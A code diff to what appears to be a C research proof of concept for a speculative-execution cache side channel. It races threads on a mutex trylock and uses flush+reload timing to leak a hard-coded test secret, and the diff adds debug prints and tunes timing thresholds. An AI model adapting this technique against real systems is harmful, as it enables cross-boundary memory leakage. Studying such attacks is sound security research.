@@ -1,5 +1,6 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include <unistd.h>
 #include <time.h>
 #include <pthread.h>
 
@@ -8,9 +9,9 @@
 #include "../lib/print_results.c"
 
 #define N_PAGES 256
-#define REPETITIONS 10
+#define REPETITIONS 3
 #define CACHE_HIT 100
-#define MAYBE_CACHE_HIT 175
+#define MAYBE_CACHE_HIT 250
 #define SECRET_SIZE 8
 #define N_TRAINING 10
 #define SECRET "mysecret"
@@ -27,12 +28,14 @@ pthread_mutex_t k;
 void* thread1(void* data) {
 
     char* allow_lock = (char*)data;
-
+    printf("t1\tlock_bool %d\n", *allow_lock);
     if(*allow_lock) {
         pthread_mutex_lock(&k);
         sleep(1);
         pthread_mutex_unlock(&k);
+        printf("t1\tunlocked!\n");
     }
+
 
     return NULL;
 }
@@ -40,11 +43,14 @@ void* thread1(void* data) {
 void* thread2(void* data) {
 
     char* s = (char*)data;
-
-    if(pthread_mutex_trylock(&k)) {
-        flush_reload_arr[SECRET[s]]
+    printf("t2\tsecret_i %d\n", *s);
+    if(pthread_mutex_trylock(&k) == 0) {
+        //volatile cp_t cp = flush_reload_arr[SECRET[0]];
+        volatile cp_t cp1 = flush_reload_arr[SECRET[*s]];
+        printf("t2\tTrylocked!!!\n");
         pthread_mutex_unlock(&k);
     }
+    //volatile cp_t cp = flush_reload_arr[1];
 
     return NULL;
 }
@@ -56,27 +62,44 @@ int* prepare(int secret_index) {
 
     //access decisions in array, repeated out-of-bounds not traceable for branch predictor
     int n_accesses = N_TRAINING -(rand() % (N_TRAINING/2)) + 1;
-    char lock_indices[n_accesses];
-    char secret_indices[n_accesses];
+    char lock_booleans[n_accesses];
     for(int i = 0; i < n_accesses; i++) {
-        lock_indices[i] = 2;
-        secret_indices[i] = 0;
+        lock_booleans[i] = false;
     }
-    lock_indices[n_accesses-1] = 0;
-    secret_indices[n_accesses-1] = secret_index;
+    lock_booleans[n_accesses-1] = true;
     cpuid();
 
     for(int i = 0; i < n_accesses; i++) {
-        //if(DBG) printf("%d:\lock %d\tsecret %d\n", i, lock_indices[i], secret_indices[i]);
-        victim_func(lock_indices[i], secret_indices[i]);
+        printf("\nround %d\n", i);
+        pthread_t t1, t2;
+        pthread_create(&t1, NULL, thread1, &lock_booleans[i]);
         cpuid();
-        if(lock_indices[i] != 0) {
+        //pthread_create(&t2, NULL, thread2, &secret_index);
+
+        printf("t2\tsecret_i %d\n", secret_index);
+        flush((void*)&k);
+        cpuid();
+        if(pthread_mutex_trylock(&k) == 0) {
+            //volatile cp_t cp = flush_reload_arr[SECRET[0]];
+            volatile cp_t cp1 = flush_reload_arr[SECRET[secret_index]];
+            printf("t2\tTrylocked!!!\n");
+            pthread_mutex_unlock(&k);
+        }
+        //volatile cp_t cp = flush_reload_arr[0];*/
+
+        pthread_join(t1, NULL);
+        //pthread_join(t2, NULL);
+
+        cpuid();
+        if(lock_booleans[i] == false) {
             cpuid();
+            printf("flushing arr!\n");
             flush_arr(flush_reload_arr, N_PAGES);
         }
         cpuid();
-    }
 
+    }
+    //volatile cp_t temp_cp = flush_reload_arr[0];
     cpuid();
 
     //time loading duration per array index
